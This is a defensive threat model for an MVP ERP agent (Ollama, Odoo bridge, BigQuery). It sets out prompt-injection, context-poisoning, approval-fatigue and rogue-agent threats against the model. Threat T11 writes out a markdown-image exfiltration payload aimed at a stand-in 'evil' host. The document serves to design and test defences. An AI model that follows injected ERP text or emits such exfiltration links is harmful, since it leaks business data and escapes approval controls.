# MVP threat model

**Date:** 2026-10-06. **Status:** proposed; covers the ADR 0001 scope (local Pydantic AI + Ollama driver, Odoo 19 bridge, streaming overlay, BigQuery read templates). The generic control matrix lives in [research 04](../research/04-enterprise-controls-and-roadmap.md). This document is narrower: it lists the threats this MVP's architecture actually exposes and the test that shows each mitigation works. No mitigation here is implemented yet.

## 1. Assets and trust boundaries

| Asset | Where |
|---|---|
| ERP business records and their integrity | Odoo sandbox (via bridge) |
| Approval authority | Kernel approvals + authenticated approver session |
| Odoo API key, BigQuery service identity | Operator secret store; adapter process only |
| Business data in context, evidence and analytics | Model context, PostgreSQL ledger, BigQuery |
| Integrity of the rule inventory and policy | Packaged domain resources, trusted policy module |

Trust boundaries: browser ↔ server API; server ↔ model runtime (Ollama); kernel ↔ driver; adapters ↔ Odoo / BigQuery; ERP data ↔ model context (data is untrusted content); deployment ↔ plugin artifacts.

The **lethal trifecta** test (private data + untrusted content + an outbound channel) applies. The MVP has private ERP data and untrusted ERP/CRM text. Outbound channels are limited to the UI rendering surface, BigQuery template parameters and the Odoo write commands. Each is constrained below.

## 2. Threats mapped to OWASP Top 10 for Agentic Applications (2026)

| ID | OWASP | Threat in this MVP | Mitigation | Test |
|---|---|---|---|---|
| T1 | ASI01 Agent goal hijack | Text in a product description, partner note or CRM lead tells the model to choose an unapproved offer or another supplier | Tool set fixed per run; validation rules independent of model text (ADR 0009); approval diff highlights material fields; read results marked as data in prompts | Injection fixtures in partner/product/lead fields; expected outcome is blocked or unchanged proposal (AgentDojo-style) |
| T2 | ASI02 Tool misuse | Model calls an allowed tool with harmful arguments (wrong company, huge quantity) | Gateway authorization + domain rules + approval; no generic `execute` (ADR 0005); scope checked by policy | Out-of-scope company ID and over-budget fixtures |
| T3 | ASI03 Identity & privilege abuse | The bridge user holds broad Odoo rights; an approver identity is spoofed via the UI host | Dedicated minimal Odoo user and company rules; identity only from authenticated server session; page record IDs are hints | Request with forged body identity; bridge call outside allowed company |
| T4 | ASI04 Supply chain | A compromised dependency or plugin artifact | Locked dependencies; admission against an artifact inventory with digests; no runtime install | Tampered wheel digest rejected at startup |
| T5 | ASI05 Unexpected code execution | Model output reaching an eval, SQL or shell path | No code-execution tools; BigQuery templates are parameterized only; no DDL/DML/scripts | Template rejects injected SQL fragment as parameter value |
| T6 | ASI06 Memory & context poisoning | A persisted continuation or evidence is reused as instruction in later runs | No cross-run memory in MVP; continuation is per run and versioned; evidence is never fed back as instructions | New run does not load prior run text |
| T7 | ASI07 Insecure inter-agent communication | — (single agent) | Not applicable in MVP; re-assess before multi-agent or A2A | — |
| T8 | ASI08 Cascading failures | Odoo timeout leads to retry storms or duplicate POs | `UNKNOWN` + reconciliation; no auto-retry of writes; per-connection writer lock; budgets | Lost-response fault injection (ADR 0005) |
| T9 | ASI09 Human-agent trust exploitation | Persuasive model text makes the approver accept a bad proposal (approval fatigue) | Approval card renders the canonical proposal and rule findings, not model prose; model text visually separated and labelled | UI test: approval card content equals the digest input (ADR 0006) |
| T10 | ASI10 Rogue agents | Model loops, ignores stop, or exceeds budgets | Kernel-enforced budgets; cancellation; run cannot raise its own budget | Budget exhaustion and cancel tests |

## 3. Additional MVP-specific threats

| ID | Threat | Mitigation | Test |
|---|---|---|---|
| T11 | **Exfiltration via rendered output.** Markdown image or link in model text carries data to an external URL (EchoLeak pattern) | Overlay renders model text as plain or sanitized markdown with no remote image loading; strict CSP (`img-src 'self'`, `connect-src` own API); links require click and show the full URL | Model text with `![x](https://evil/?d=...)` produces no network request |
| T12 | **Reasoning leakage** into storage or telemetry | ADR 0004 hygiene; ADR 0008 content capture off | Thinking-enabled run leaves no reasoning in stores or traces |
| T13 | **Cross-border transfer.** ERP data with personal data is copied to BigQuery in a non-Vietnam region | Synthetic data only until data owner, region and legal basis are recorded (Vietnam PDPL 91/2025/QH15 effective 2026-01-01 requires a cross-border transfer impact assessment); templates read only approved datasets | Configuration check refuses non-allowlisted project, dataset or region |
| T14 | **Wrong target environment.** Commands hit `odoo-bench` or a non-sandbox database | Sandbox marker plus explicit URL, database and company allowlist checked at startup and before each write | Startup against unmarked database fails |
| T15 | **CSRF or cross-origin command** from an Odoo-hosted overlay | Same-origin with server-side CSRF validation, or explicit origin allowlist plus token exchange; no secrets in URLs or postMessage | Cross-origin POST without valid token rejected |
| T16 | **Ledger store co-located with Odoo DB** | Separate PostgreSQL database and role for e-agent | Profile validation rejects Odoo DB URL |
| T17 | **Prompt/tool-schema drift** mid-run | Tool set and schema digests pinned in run record; mismatch on resume blocks | Change schema between approval and resume → blocked |

## 4. Residual risks accepted for MVP

- Local single-operator identity mapping is not production authentication.
- Injection can still steer *arguments within allowed bounds*, such as which of two approved offers is chosen. Rules and approval limit the damage but do not eliminate it.
- The local Ollama runtime and its model files are trusted. Model provenance is recorded but not cryptographically verified.
- No tamper-evident audit log (hash chaining, WORM storage) in the MVP; evidence integrity relies on database access control.

## 5. References

- [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- [Design Patterns for Securing LLM Agents against Prompt Injections](https://arxiv.org/abs/2506.08837); [CaMeL](https://arxiv.org/abs/2503.18813); [AgentDojo](https://arxiv.org/abs/2406.13352)
- [MCP security best practices](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices) (relevant if MCP is added later)
- Vietnam PDPL overview: [Baker McKenzie](https://connectontech.bakermckenzie.com/vietnam-decoding-vietnams-pdp-law-gdpr-inspired-rules-with-local-twists/)
